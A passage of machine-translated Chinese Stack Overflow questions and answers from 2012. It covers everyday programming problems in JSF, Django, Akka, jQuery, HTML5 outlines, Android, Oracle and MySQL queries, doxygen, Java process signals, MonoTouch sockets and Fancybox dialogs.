    socket.on('connection', function(client) {
        ...
        var cookie_string = client.handshake.headers.cookie;
        var parsed_cookies = connect.utils.parseCookie(cookie_string);
        var sessionid = parsed_cookies['sessionid'];
        ...
    }); 
    ```

*   从 sessionid 对应的 db 中检索和解码会话数据以获取用户 ID。

# jsf-2 - 将 Apache Myfaces 与 Prime 面孔一起使用

> ID：10446051
> 
> 赞同：1
> 
> 时间：2012-05-04T09:17:16.700
> 
> 标签：jsf-2, primefaces, myfaces

我是 JSF 2.0 的新手。

我正在使用 JSF 2.0 的 apache Myfaces 实现。

此外，我想使用 Prime 面孔来制作更好的 UI 组件。

但我面临的问题是：

两者的标签`Prime faces and Myfaces`相同。

我如何解决前缀。

例如：`h: and f:`

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-04T14:39:04.300

PrimeFaces 在命名空间中没有任何标签`http://java.sun.com/jsf/*`。它在命名空间中只有标签`http://primefaces.org/*`。命名空间中的标记`http://java.sun.com/jsf/*`是具体 JSF 实现的一部分，在您的情况下是 MyFaces。PrimeFaces 只是一个组件库，而不是 JSF 实现。您应该在具体的 JSF 实现之上运行 PrimeFaces。

因此，一旦在 webapp 的运行时类路径中同时拥有 MyFaces 和 PrimeFaces，应该这样做：

```
<!DOCTYPE html>
<html lang="en"
    xmlns="http://www.w3.org/1999/xhtml"
    xmlns:f="http://java.sun.com/jsf/core"
    xmlns:h="http://java.sun.com/jsf/html"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:p="http://primefaces.org/ui"
>
    <h:head>
        <title>Title</title>
    </h:head>
    <h:body>
        <h1>PrimeFaces editor demo</h1>
        <p:editor />
    </h:body>
</html> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T12:29:22.107

使用以下 xmlns:p="http://primefaces.org/ui" 包含 primefaces

# django - 如何从 Django 查询中过滤列表？

> ID：10446055
> 
> 赞同：0
> 
> 时间：2012-05-04T09:17:29.383
> 
> 标签：django, django-queryset

我有以下情况。我有 3 个模型 - 学校、用户、SchoolTeacher。教师可以是许多学校的一部分。现在，当用户搜索时，我们会根据某些标准显示学校列表。我们还想为每所学校显示用户是否是该学校的老师。现在，我想在一个查询中得到结果，所以我这样做了

```
users_list = list(SchoolTeacher.objects.filter(school__in = result_list, user=self.user).values('school_id'))

users_teacher_ids = []

for item in users_list :
        users_teacher_ids .append(item['school_id']) 
```

然后，我附加到每个 School 对象上，

```
schoolobj.is_user_teacher = schoolobj.id in users_teacher_ids 
```

我可以做一些比这更好的事情吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T11:08:35.523

如果您的模型如下所示：

```
class School(models.Model):
   # -- your fields

class SchoolTeacher(models.Model):
   schools = models.ManyToManyField(School)
   # -- other fields 
```

然后你可以这样做：

```
my_school = School.objects.get(pk=1)
my_school.schoolteacher_set.all() # all teachers in a particular school 
```

有关更多信息，请参阅文档中的[多对多反向关系](https://docs.djangoproject.com/en/dev/topics/db/queries/#m2m-reverse-relationships)。

# scala - 如何编辑akka application.conf

> ID：10446058
> 
> 赞同：2
> 
> 时间：2012-05-04T09:17:49.667
> 
> 标签：scala, configuration, akka

我正在寻找有关如何编写自定义 application.conf 的教程。我阅读了 akka 文档并尝试了 Pi 示例。

但现在我想运行我自己的配置。我的目标是覆盖路由器类型并更改路由的数量。这是我的代码：

```
package org.sddb.playground

import akka.actor._
import com.typesafe.config.ConfigFactory
import akka.routing.RoundRobinRouter

object Test extends App {

  case object Log
  case object Ask

  class Tester extends Actor with ActorLogging {

    def receive = {
      case Log => logging
      case Ask => answer
    }

    def logging {
      log error "error"
      log warning "warning"
      log debug "debug"
    }

    def answer {
      log info "somebody asked"
    }
  }
  val config = ConfigFactory.load
  val system = ActorSystem("TestSystem", config.getConfig("test"))
  val tester = system.actorOf(Props[Tester].withRouter(RoundRobinRouter(2)))
  tester ! Log
  tester ! Ask
  tester ! PoisonPill
  system.shutdown
} 
```

我的 application.config 看起来是这样的：

```
test {
  akka.loglevel = DEBUG
  deployment {
    /tester {
      router = broadcast
      nr-of-instances = 5
    }
  }
} 
```

调试级别的登录是可以的，但既没有广播也没有 5 个实例。我的错误在哪里？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-04T09:58:28.497

那是因为您正在显式创建 RoundRobinRouter(2) 。你必须通过`FromConfig()`，而且你必须通过“tester”作为名称。

编辑：

您的配置部分错误，应该是：

```
test {
  akka.loglevel = DEBUG
  akka.actor.deployment {
    /tester {
      router = broadcast
      nr-of-instances = 5
    }
  }
} 
```

但你也可以这样做

```
akka {
  loglevel = DEBUG
  actor {
    deployment {
      /tester {
        router = broadcast
        nr-of-instances = 5
      }
    }
  }
} 
```

那么您不必手动传递配置。

# javascript - 用于在选择选项中保留所选值的 Jquery

> ID：10446060
> 
> 赞同：1
> 
> 时间：2012-05-04T09:17:59.600
> 
> 标签：javascript, jquery, html

我正在使用我的选择下拉菜单播放一些显示/隐藏功能。这是选择的html，

```
<select id="sel1" size="1" name="">
    <option selected="selected" value="0">Select Here</option>
    <option value="1">Option 1</option>
    <option value="2">Option 2</option>
</select> 
```

这是我的jQuery，

```
$(document).ready(function(){
    $("#sel1").change(fun);  
});

function fun(){  
   var selected = $("#sel1 option:selected");       

   if(selected.val() == 1) {  
      $("#div1").slideDown("slow");
      $('#div2').slideUp("slow");
   } else if(selected.val() == 2) {
      $("#div1").slideUp("slow");
      $('#div2').slideDown("slow");
   } else {
      $("#div1").slideUp("slow");
      $('#div2').slideUp("slow");
   }
}; 
```

但是在将值发送到服务器并返回后，我想根据下拉列表中的值选择保留 div1 或 div2 。但截至目前，两个 div 都没有显示，因为 display=none 在初始级别。有什么办法可以保留这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T09:39:45.287

如果您的 HTML 是使用服务器端语言生成的，那么您最好的选择是仅`display: none`在适当的时候向它们添加 CSS 属性。或者，您可以`change`在 DOM 准备好时触发事件处理程序，使用：

```
$(document).ready(function(){
    $("#sel1").change(fun).trigger('change');  
}); 
```

# html - 使用部分元素和标题构建网站的内容

> ID：10446061
> 
> 赞同：0
> 
> 时间：2012-05-04T09:18:05.540
> 
> 标签：html, semantic-markup, html-heading

我已经知道在讨论部分元素的使用之外有很多线程 - 我已经阅读了很多，到目前为止我得出了以下结论：

<section> 元素应该用于包装可以存储为单个数据库记录的内容。（根据 HTML5doctor）并且标题应该*在*section 元素内（尽管在数据库中我不会将标题存储在与内容相同的列中......））

到目前为止一切顺利，我重新组织了我的网站结构，并通过[http://gsnedders.html5.org/outliner/](http://gsnedders.html5.org/outliner/)对其进行了分析- 但令人惊讶的是它忽略了我的 h1、h2、... 标题顺序（我在某处读到了那个特别的元素重置标题左右..？：S）这有点让我发疯。

到目前为止，我已经有了一个类似的结构（为了造型目的跳过了一些 div）：

```
<header>
    <section>
        h1 // title of my page --> h1
    </section>
    <section>
        <nav>...</nav>
    </section>
</header>
<div role="main"> // don't use section for your website's main content
    h2 // main content
    <section>
        h3 // main content's sub heading
    </section>
    <section>
        h4 // sub heading of main content's sub heading
            h5
            h5
    </section>
    <section>
        h3 // another main content's sub heading
    </section>
</div>
<aside>
    <section>
        h3 // about me
    </section>
</aside> 
```

而不是预期的大纲：

```
title of my page
    navigation
    main content
        main content's sub-headings, etc.
    about me 
```

我有：

```
main content
    title of my page
    navigation
    main content's sub entries
    about me 
```

当然，我可以将标题包含在某些部分元素中以重置此计数器，但我永远不会将整个主要内容存储为单个数据库条目 - 所以这将是对语义元素的无语义使用，这使得整个工作有些多余.

我是否错过了部分元素或嵌套标题的要点？任何如何处理这种行为的建议（这在理论上听起来很棒，但在实践中它似乎以一种奇怪的方式表现......）

编辑：我决定坚持“在可能是 RSS 项目的元素上使用文章”规则，因为这对我来说更有意义，并继续使用 section 元素将主要内容与导航等分开。（如下回答）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:10:01.113

**截面元素**

我不确定我是否同意您的部分定义。从HTML5规范它说

> section 元素表示通用文档或应用程序部分。

它继续说

> 当联合元素的内容有意义时，鼓励作者使用 article 元素而不是 section 元素。

因此，如果您要将某些内容存储为“单个数据库条目”，我认为应该使用文章代替部分。另请参阅[section](http://www.impressivewebs.com/html5-section/)元素的 DO 和 DON'T 的良好列表。

**文件大纲**

就您的文档大纲而言，很难说出发生了什么，因为您没有包含任何结束标签。你能发布一个完整、有效的 HTML 示例吗？

[Mozilla Developers Network](https://developer.mozilla.org/en/Sections_and_Outlines_of_an_HTML5_document)上的 HTML5 文档大纲有一个很好的概述，我建议您阅读。以你的例子并在我认为应该的地方添加结束标签，并根据这篇文章，我会提出 HTML

```
<doctype html>
<header>
    <h1>title of my page</h1>
</header>
<nav>My Nav</nav>
<article id="main-content">
    <h2>main content</h2>
    <section>
        <h3>main content's sub heading</h3>
        <section>
            <h4>sub heading of main content's sub heading</h4>
            <section>
                <h5>a sub, sub heading of main content's sub heading</h5>
            </section>
        </section>
    </section>
    <section>
        <h3>another main content's sub heading</h3>
     </section>
</article>
<aside>
    <h3>about me</h3>
</aside> 
```

这产生了轮廓

1.  我的页面标题
    1.  无标题部分（这是导航）
    2.  主要内容
        1.  主要内容的子标题
            1.  主要内容的子标题的子标题
                1.  主要内容的子标题的子标题
    3.  另一个主要内容的子标题
    4.  关于我

这是你期望的大纲吗？

**章节标题**

请注意，您不必使用`h1`,`h2`等`h3`，HTML5 大纲将根据您的文章或部分的嵌套深度确定什么是标题、子标题等。如果您愿意，您可以在`h1`任何地方使用（尽管不要），并且大纲仍然会产生上述大纲。

# asp.net-mvc - 表达式树可能不包含动态操作 - mvc

> ID：10446065
> 
> 赞同：4
> 
> 时间：2012-05-04T09:18:14.740
> 
> 标签：asp.net-mvc, model

我的代码中有这个：

```
@model Tuple<IEnumerable<dynamic>, IEnumerable<dynamic>, IEnumerable<dynamic>>

@(Html.Telerik().Grid(Model.Item3)
    .Name("Grid")
    .DataKeys(keys => keys.Add(c => c.Id))
) 
```

我得到了错误：表达式树可能不包含动态操作。

这是控制器代码：

```
FirstClass firstC= new FirstClass ();
IEnumerable<dynamic> first= firstC.All();

SecondClass secondC= new SecondClass ();
IEnumerable<dynamic> second= secondC.All();

ThirdClass thirdc = new ThirdClass ();
IEnumerable<dynamic> third= thirdc .All();

Tuple<IEnumerable<dynamic>, IEnumerable<dynamic>, IEnumerable<dynamic>> result =
            new Tuple<IEnumerable<dynamic>, IEnumerable<dynamic>, IEnumerable<dynamic>>(firstC, secondC, thirdc );
return View(result); 
```

如何解决这个问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-04T09:25:38.883

表达式不能与动态类型一起使用。您将不得不使用强类型视图模型：

```
@model Tuple<IEnumerable<VM1>, IEnumerable<VM2>, IEnumerable<VM3>> 
```

# extjs - 设置可扩展日历的问题

> ID：10446068
> 
> 赞同：0
> 
> 时间：2012-05-04T09:18:38.220
> 
> 标签：extjs, calendar, extjs4.1, extensible

我正在尝试在我的 ExtJs 4.1 应用程序中设置[Extensible Calendar Pro](http://ext.ensible.com/products/calendar/)，但我仍然收到*名称未定义*错误。

**编辑：**

我解决了原来的问题，但直接进入另一个。

更新代码：

```
Ext.define('ZeuS.view.panels.ZeusMainPanel',{
    extend: 'Ext.panel.Panel',
    id : 'zeusMainPanel',
    alias : 'widget.zeus',

requires : [
    'Extensible.Extensible',
    'Extensible.calendar.CalendarPanel',
    'Extensible.calendar.data.MemoryEventStore',
    'Extensible.calendar.data.EventModel',
    'Extensible.calendar.view.*'
],

    autoShow : true,
    layout : 'border',
    border : false,

    initComponent : function(){
        this.items = [{
                /*
                 * Some other Ext Elements
                 */
            }, {
                region : 'east',
                xtype : 'extensible.calendarpanel',
                name : 'zeus-calendar',
                width : 500,
                eventStore: Ext.create('Extensible.calendar.data.EventStore', {
                    data: Ext.create('Extensible.calendar.data.EventModel',{
                        StartDate: '2101-01-12 12:00:00',
                        EndDate: '2101-01-12 13:30:00',
                        Title: 'My cool event',
                        Notes: 'Some notes'
                    })
                })
            }
        ];

        this.callParent(arguments);
    }

}); 
```

现在，当包含可扩展单例时，它会正确加载所有类，但没有任何作用。我只有一个白屏，控制器或其他任何地方都没有调用任何功能。当我从需求列表中删除它时，会出现以下错误：`Extensible.log is not a function`

我可以使用插件吗？

有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-07T00:24:15.230

Extensible.log 是在可扩展单例上定义的，因此如果您的依赖项和包含设置正确，它应该始终可用。您确实应该在可扩展论坛上发布附加详细信息（Ext 版本、可扩展版本、脚本包含标记），因为这基本上是一个产品支持问题。

编辑：顺便说一句，没有Extensible.Extensible之类的东西，这可能是您问题的一部分。您也不能对非 Sencha 类使用通配符 requires 语句。在尝试使用它创建复杂布局之前，您可能会先尝试获取一个基本示例。

# android - 按下状态的 TextView ClickableSpan 样式

> ID：10446079
> 
> 赞同：15
> 
> 时间：2012-05-04T09:19:46.387
> 
> 标签：android, textview

我将 ClickableSpan 子类化以自定义 TextView 中链接的文本样式。

```
private static class LinkSpan extends ClickableSpan {
    @Override
    public void onClick(View widget) {
         // code...
    }

    @Override
    public void updateDrawState(TextPaint ds) {
        super.updateDrawState(ds);
        ds.setUnderlineText(false);
        ds.setTypeface(Typeface.create(ds.getTypeface(), Typeface.BOLD));
        ds.setColor(0xff336699);
    }
} 
```

我想在它处于按下状态或用户触摸链接时更改样式。（就像`a:hover`在 css 中一样）但我想不出一种方法来获取当前状态`updateDrawState`。

有没有办法处理这个？如果我不能更改文本样式，我希望至少能够更改背景颜色。

**正如评论所指出的那样**编辑，您可以**[在按下时更改单个 ClickableSpan 的文本颜色而不影响同一 TextView 中的其他 ClickableSpan 中找到答案](https://stackoverflow.com/questions/20856105/change-the-text-color-of-a-single-clickablespan-when-pressed-without-affecting-o/20905824#20905824)**

 *** * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-11T08:42:48.817

为了改变背景颜色，我做了

```
testTextView.setHighlightColor(Color.BLUE); 
```

在文本视图上。

但是有机会改变文本颜色对我来说会更好。**

# sql - 在对行进行分组时需要帮助

> ID：10446086
> 
> 赞同：0
> 
> 时间：2012-05-04T09:20:11.230
> 
> 标签：sql, oracle, plsql, aggregate-functions, string-aggregation

> **可能重复：**
> [如何在 Oracle 中将多行组合成逗号分隔的列表？](https://stackoverflow.com/questions/468990/how-can-i-combine-multiple-rows-into-a-comma-delimited-list-in-oracle)

我有一个以下列方式存储数据的表-

```
60333,120102,20120502,010000,1,2

60333,120102,20120502,020000,3,4 

60333,120102,20120502,030000,5,6 

60333,120102,20120502,040000,7,8 

61663,120103,20120502,010000,9,10 

61663,120103,20120502,020000,11,12 

61663,120103,20120502,030000,13,14 

61663,120103,20120502,040000,15,16 

60333,120102,20120503,010000,17,18 

60333,120102,20120503,020000,19,20 

60333,120102,20120503,030000,21,22 

60333,120102,20120503,040000,23,24 
```

我预计会显示如下输出：

```
60333,120102,20120502,1,2,3,4,5,6,7,8

60333,120102,20120503,17,18,19,20,21,22,23,24

61663,120103,20120502,,9,10,11,12,13,14 ,15,16 
```

对于唯一的 60333、120102 和 Date，所有数据都需要显示在一行而不是 4 行中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-06T23:33:12.273

尝试这个：

```
select a, b, c, listagg(e || ',' || f, ',') WITHIN GROUP (ORDER BY e) as x
from tbl
group by a, b, c 
```

现场测试：[http ://www.sqlfiddle.com/#!4/40a4b/13](http://www.sqlfiddle.com/#!4/40a4b/13)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-06T23:18:20.107

如果我们假设：

1.  第 4 列只能取 4 个值 (010000,020000,030000,040000) 和
2.  您希望输出中始终包含 11 列

那么你需要["pivot query"](http://asktom.oracle.com/pls/apex/f?p=100:11:0%3a%3a%3a%3aP11_QUESTION_ID:766825833740)，它是这样的：

```
select c1, c2, c3, 
    max(decode(c4, '010000', c5)) as c5for010000,
    max(decode(c4, '010000', c6)) as c6for010000,
    max(decode(c4, '020000', c5)) as c5for020000,
    max(decode(c4, '020000', c6)) as c6for020000,
    max(decode(c4, '030000', c5)) as c5for030000,
    max(decode(c4, '030000', c6)) as c6for030000,
    max(decode(c4, '040000', c5)) as c5for040000,
    max(decode(c4, '040000', c6)) as c6for040000
my_table
group by c1, c2, c3; 
```

# android - 在android中获取远程图片导致NetworkOnMainThreadException

> ID：10446093
> 
> 赞同：1
> 
> 时间：2012-05-04T09:20:42.577
> 
> 标签：android, facebook, get, image

首先，对不起我糟糕的英语。

我正在尝试创建一个使用官方 Facebook API 连接到 Facebook 的简单 android 应用程序。当用户登录并授权我的应用程序时，我想获取他/她的用户名和头像，然后显示在我的应用程序中。我采用了 Facebook API 附带的 Hackbook 示例应用程序中的一些代码。这是我在主要活动类中的代码。

```
public class SocialApp2Activity extends Activity {
    private Handler handler;

    private Facebook facebook;
    private AsyncFacebookRunner asyncRunner;

    private TextView text;
    private ImageView imgUserPic;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        handler = new Handler();

        text = (TextView) findViewById(R.id.txt);
        imgUserPic = (ImageView) findViewById(R.id.user_pic);

        facebook = new Facebook("MY_FB_APP_ID");
        asyncRunner = new AsyncFacebookRunner(facebook);

        facebook.authorize(this, new DialogListener() {
            @Override
            public void onComplete(Bundle values) {
                Bundle params = new Bundle();
                params.putString("fields", "name, picture");
                asyncRunner.request("me", params, new UserRequestListener());
            }

            ... 

        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        facebook.authorizeCallback(requestCode, resultCode, data);
    }

    /* Callback for fetching username and profile picture */
    public class UserRequestListener implements RequestListener {

        @Override
        public void onComplete(final String response, final Object state) {

            JSONObject jsonObject;

            try {
                jsonObject = new JSONObject(response);

                final String picURL = jsonObject.getString("picture");
                final String name = jsonObject.getString("name");

                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        text.setText(name);

                        /********************************
                         *** This line cause an error ***
                         ********************************/
                        imgUserPic.setImageBitmap(Utility.getBitmap(picURL));

                    }
                });
            } catch (JSONException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        ...
    }
} 
```

我在调用我自己的从远程服务器读取个人资料图片位图数据的方法时出错。错误是 NetworkOnMainThreadException 并且这里有一些堆栈跟踪。

```
05-04 14:37:28.898: W/System.err(1117): android.os.NetworkOnMainThreadException
05-04 14:37:28.905: W/System.err(1117):     at android.os.StrictMode$AndroidBlockGuardPolicy.onNetwork(StrictMode.java:1084)
05-04 14:37:28.905: W/System.err(1117):     at java.net.InetAddress.lookupHostByName(InetAddress.java:391)
...
05-04 14:37:29.005: W/System.err(1117):     at libcore.net.http.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:164)
05-04 14:37:29.005: W/System.err(1117):     at promlert.socialapp2.Utility.getBitmap(Utility.java:26)
05-04 14:37:29.016: W/System.err(1117):     at promlert.socialapp2.SocialApp2Activity$UserRequestListener$1.run(SocialApp2Activity.java:95)
... 
```

您能否建议我如何解决此问题。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:41:33.540

handler.post(Runnable runnable) 正在 UI 线程上执行 runnable。所以如果你试图在 UI 线程上执行网络操作 - 你会得到这个异常。为避免这种情况：首先不从 UI 线程调用 Utility.getBitmap(picURL)，然后仅在 UI 线程上发布 imgUserPic.setImageBitmap() 方法：

```
new Thread(new Runnable() {

                @Override
                public void run() {
                    //this line must be called not from the UI  thread
                final Bitmap bitmap = Utility.getBitmap(picURL)
                handler.post(new Runnable() {
                @Override
                public void run() {
                                   text.setText(name);
                                   imgUserPic.setImageBitmap(bitmap );

                                  }
                  });   
                }
}).start(); 
```

# mysql - SQL 删除垃圾邮件行，更新最近的行

> ID：10446101
> 
> 赞同：0
> 
> 时间：2012-05-04T09:21:14.237
> 
> 标签：mysql, sql, row

我目前正在使用 MySQL 在 PHP 中制作公共参考指南。有时垃圾邮件发送者会更改内容，我想恢复到以前版本的页面。

所有版本的页面都被存储，所以我的问题只是查询。

```
UPDATE pages new, pages old SET new.status='2',old.status='1' WHERE new.ip='<spambotip>' AND new.status='0' AND old.title=new.title AND old.status='1' AND old.last_modified IN (SELECT max(last_modified) FROM pages tr WHERE tr.title = new.title AND tr.status='0') 
```

但是我收到以下错误：

> 您不能在 FROM 子句中为更新指定目标表“新”

我的查询旨在查找垃圾邮件机器人创建的所有状态 = 1（活动）的页面，将该页面的状态设置为 2（垃圾），然后找到具有最高 last_modified、相同标题且状态为 0（非活动）的页面并将那个人的状态设置为1。

我认为我需要使用内部循环，但我无法想象如何完成它。我用谷歌搜索了一下，但没有找到任何我可以使用的东西。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T09:54:23.843

编辑：

```
Dim sList as String  = ... SELECT group_concat(title) FROM pages WHERE ip='<spambotip>'

UPDATE pages  SET staus=2 where  title IN (...)

 UPDATE pages SET status=1 where id IN (SELECT id from (SELECT id,  max(last_modified) from pages where title in (...) and status=0 group by title) x ) 
```

# doxygen - 显示未记录的函数参数

> ID：10446102
> 
> 赞同：2
> 
> 时间：2012-05-04T09:21:16.003
> 
> 标签：doxygen

我正在使用 doxygen 生成 C++ 代码的 HTML 文档。不幸的是，doxygen 没有在方法描述中显示未记录的方法参数。例如，使用以下

```
/**
 * Some method
 * @param p1 Some param
 */
void method(const std::string& p1, const std::string& p2); 
```

方法描述将显示注释和参数`p1`，但不显示`p2`。

即使没有明确记录，如何配置 doxygen 以列出方法描述中的所有参数？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-05T13:05:07.750

这是不可能的。

Doxygen 可以警告您不完整、错误或缺少参数文档。

相关设置如下：

```
WARNINGS          = YES
WARN_IF_DOC_ERROR = YES
WARN_NO_PARAMDOC  = YES 
```

# java - 如何在Java中向子进程发送信号？

> ID：10446103
> 
> 赞同：2
> 
> 时间：2012-05-04T09:21:20.737
> 
> 标签：java, process

java.lang.Process 有一个名为 destroy() 的方法。文件说：

> 此 Process 对象所代表的子进程被强制终止。

我想知道调用 destroy() 时发送的是哪个信号？

我正在使用 Linux。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:04:12.290

我假设“调用破坏时发送哪个信号？” 您指的是实际的系统调用。（我不能评论你的主要问题还需要你确认）

在快速浏览了 ProcessBuilder 的 OpenJDK 实现源之后，我发现实际调用最终是一个本地调用 ..（好吧，不！：p）

从适当的方法查看本机源代码后：

*   Windows: TerminateProcess((HANDLE) 句柄, 1);
*   UNIX：杀死（pid，SIGTERM）；

希望有帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:57:10.397

从谷歌搜索它建议使用 SIGTERM 。我找不到这方面的参考，但这似乎是合理的。

# c# - 增加 Monotouch 中的 ThreadPool 线程数？

> ID：10446113
> 
> 赞同：1
> 
> 时间：2012-05-04T09:22:02.613
> 
> 标签：c#, ios, sockets, xamarin.ios, asyncsocket

我已经使用 Sockets 为我的应用程序编写了网络代码。我已经在 Windows PC 上测试了这个库，它非常快。无论是在很短的时间内传输数据的许多小“数据包”（数据包是指发送操作，我使用的是流式传输的 TCP），还是几个大数据包，它都能完美运行。

我将代码移到了 iPhone 的测试应用程序中。跑了测试，速度又快了。大约 5 MB 在大约 3 秒内通过 wifi 在两部手机之间发送。

我在线程池线程中使用同步 Socket.Send() 操作，并使用 ReceiveAsync() 进行接收。（我也尝试过 BeginReceive() 样式，但它的行为相同。

但是，一旦我将代码移动到我的应用程序中，我就会开始遇到问题。一般问题是接收应用程序似乎没有一致地接收。我可以从主机电话发送几个“数据包”，它可以在任何时间，从即时到几秒钟到 10 分钟，然后它们才会出现在接收端。我已经解决这个问题两周了（晚上/周末），我花了几天时间测试它，试图准确地理解我能做些什么来重现它，但它从来没有两次相同。

目前，我把它归结为线程池线程被耗尽。我用过

```
ThreadPool.SetMaxThreads() 
```

大幅增加线程数，但没有任何区别。就好像 SocketAsyncEventArgs 中的已完成回调无法让线程进行操作，所以它就坐在那里。我已经检查了我的代码并重构了任何不必要地使用带有循环执行周期性任务的线程并将它们更改为计时器的内容，但问题仍然存在。

我真的不知道该转向哪里。我希望它可能是 Monotouch 中的一个错误（不是我试图责怪那些人！）。

我不确定要发布什么代码，因为网络代码已经过自己的测试并且运行良好。我已经用 1,000,000 次发送/接收对其进行了测试，以检查是否存在某种泄漏，但没有发现任何问题。

似乎数据正在到达接收方，但回调在被调用时会以某种方式被严重延迟，有时会延迟几分钟。

谁能指出我为什么会发生这种情况？

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-05T09:07:13.933

我的问题是由 GKSession 也初始化引起的。我希望这是可以修复的 Monotouch/Mono 中的错误，因为我确实需要启用这两个网络功能。一旦我禁用 GKSession，套接字代码就会自由流动。

# javascript - Javascript 数组 indexFirst

> ID：10446116
> 
> 赞同：0
> 
> 时间：2012-05-04T09:22:11.620
> 
> 标签：javascript, arrays

我构建了一个处理页面的原型，我成功添加（推送），但可以获取数据，我失败了：

```
var foundImageIndex = Pages.indexFirst(function (item) { if (item.PageID == PageID) return true; }); 
```

这里是 javascript 页面处理程序：

```
var Pages = new Array();

PageContainer = function () //constructor for the proxy
{
   // this._baseURL = url;
};

PageContainer.prototype =
{

    AddPage: function (data) {
        if (data == null) return;
        Pages.push({ PageID: data.PageID, SegmentID: data.SegmentID });
    },

    GetPage: function (PageID) {
        alert('getPage('+PageID+')=' + JSON.stringify(Pages));

        var foundImageIndex = Pages.indexFirst(function (item) { if (item.PageID == PageID) return true; });

        var dt = { PageID: Pages[foundImageIndex].PageID, SegmentID: Pages[foundImageIndex].SegmentID };
        return dt;
    }

}; 
```

我从其他js调用如下：

```
var gPageContainer = new PageContainer();

 for (var i = 0; i < SegStruct.SegmentsCount; i++) {
                var segRClass = //get from webservice
                gPageContainer.AddPage({ PageID: i, SegmentID: segRClass.SegmentID });

            } 
```

我试图调用：gPageContainer.GetPage(1); 但它在 **GetPage: function (PageID)**中失败，它在以下位置返回 -1： var foundImageIndex = Pages.indexFirst(function (item) { if (item.PageID == PageID) return true; });

foundImageIndex 总是 -1

为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-05T10:21:18.023

只需在构造函数之前添加以下内容：

```
if (typeof Array.prototype.indexFirst == 'undefined') {
    Array.prototype.indexFirst = function (validator) {
        for (var i = 0; i <= this.length - 1; i++) {
            if (validator(this[i])) {
                return i;
            }
        }
        return -1;
    };
} 
```

# javascript - Fancybox 的 Javascript/Jquery 回调 是 否 确认

> ID：10446122
> 
> 赞同：3
> 
> 时间：2012-05-04T09:22:30.623
> 
> 标签：javascript, jquery, fancybox

我正在尝试实现一个奇特的 Yes No 确认，但我在让回调根据需要工作时遇到问题。下面的示例使用[Fancybox v2](http://fancyapps.com/fancybox/#docs)。

下面代码的问题是，当`HREF`单击“测试”时正在调用函数“do_something”，而在用户单击时未调用函数“do_something” `#fancyConfirm_ok`。

```
function fancyConfirm(msg,callback) {
    var ret;
    jQuery.fancybox({
        'modal' : true,
        'content' : "<div style=\"margin:1px;width:240px;\">"+msg+"<div style=\"text-align:right;margin-top:10px;\"><input id=\"fancyconfirm_cancel\" style=\"margin:3px;padding:0px;\" type=\"button\" value=\"Cancel\"><input id=\"fancyConfirm_ok\" style=\"margin:3px;padding:0px;\" type=\"button\" value=\"Ok\"></div></div>",
        'afterShow' : function() {
            jQuery("#fancyconfirm_cancel").click(function() {
                ret = false;
                //jQuery.fancybox.close();
                $.fancybox.close();
            })
            jQuery("#fancyConfirm_ok").click(function() {
                ret = true;
                jQuery.fancybox.close();
            })
        },
        'afterClose' : function() { 
            if (typeof callback == 'function'){ 
                callback.call(this, ret); 
            } else {
                var callback_type = typeof callback;
                alert(callback_type);
            }
        }
    });
}
<a href="#" onclick="fancyConfirm('Are you sure you want to delete?',  do_something('a', 'b') );return false;">Test</a> 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-04T17:56:02.923

每当用户单击链接时，您的方法“do_something('a', 'b')”将被执行，并且返回的结果将作为第二个参数传递给“fancyConfirm”方法。这就是为什么您的参数“回调”总是“未定义”的原因。

fancyBox 也有一个问题——“afterClose”回调被调用了两次——在打开之前和关闭之后（这将在下一个版本中更改）。

我会在链接上绑定一个单击事件并在用户单击其中一个按钮时调用回调，例如 - [http://jsfiddle.net/xcJFY/1/](http://jsfiddle.net/xcJFY/1/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-29T13:46:31.597

不是双重回调方法的忠实粉丝（[抱歉 Janis](https://stackoverflow.com/a/10453807/692942)）。

因此，在尝试找到解决方案时，我自己玩弄了类似的代码，发现只要我的返回值没有在函数范围内定义它就可以正常工作，当我的返回值在函数内部定义时，我会变得很奇怪它会工作一段时间然后恢复为未定义的行为。

实际上，返回值需要在函数、全局、闭包等范围之外。

```
$(document).ready(function() {
    $(".fancybox").on("click", function(e){   
        e.preventDefault();
        confirm("Do you wish to continue?", true, function(resp) {
            alert("You clicked " + resp);
        });
    });
});

function confirm(msg, modal, callback) {
    $.fancybox("#confirm",{
        modal: modal,
        beforeShow: function() {
            $(".title").html(msg);
        },
        afterShow: function() {
            $(".confirm").on("click", function(event){
                if($(event.target).is(".yes")){
                    ret = true;
                } else if ($(event.target).is(".no")){
                    ret = false;
                }
                $.fancybox.close();
            });
        },
        afterClose: function() {
            callback.call(this, ret);
        }
    });  
} 
```

这是一个`[jsfiddle](http://jsfiddle.net/zLBNH/262/)`例子

